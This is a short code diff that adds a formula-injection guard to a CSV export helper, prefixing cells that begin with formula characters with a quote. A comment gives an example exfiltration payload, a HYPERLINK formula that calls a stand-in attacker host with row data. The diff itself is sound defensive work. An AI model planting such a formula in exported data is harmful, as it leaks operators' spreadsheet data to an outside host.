@@ -803,7 +803,17 @@ router.get(
 
 function csvCell(value: unknown): string {
   if (value == null) return "";
-  const s = String(value);
+  let s = String(value);
+  // Formula-injection guard: Excel / Google Sheets / Numbers all
+  // evaluate cells beginning with =, +, -, @, or a tab/CR as
+  // formulas, so a recipient_email like
+  // `=HYPERLINK("http://attacker?p="&A1,"hi")` could exfiltrate
+  // row data when an operator opens the CSV. Prefix any such
+  // string with `'` (Excel's "treat as literal" convention) and
+  // re-wrap so the leading char stays inert.
+  if (/^[=+\-@\t\r]/.test(s)) {
+    s = `'${s}`;
+  }
   if (/[",\n\r]/.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
   }
